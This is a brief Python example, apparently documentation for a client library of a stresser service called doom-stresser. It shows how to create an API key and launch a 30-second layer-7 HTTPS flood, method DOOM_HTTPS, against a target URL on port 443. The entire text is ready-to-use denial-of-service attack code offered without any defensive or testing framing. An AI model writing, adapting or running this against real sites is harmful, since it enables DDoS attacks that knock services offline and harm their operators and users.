from doomstresser import DoomApi, L7Method

#Create key - https://doom-stresser.cc/api
doom = DoomApi("<user-id>", "<key>") 

response = doom.layer7.attack(
    target="https://target.url/",
    port=443,
    method=L7Method.DOOM_HTTPS,
    duration=30
)

print(response) #text from server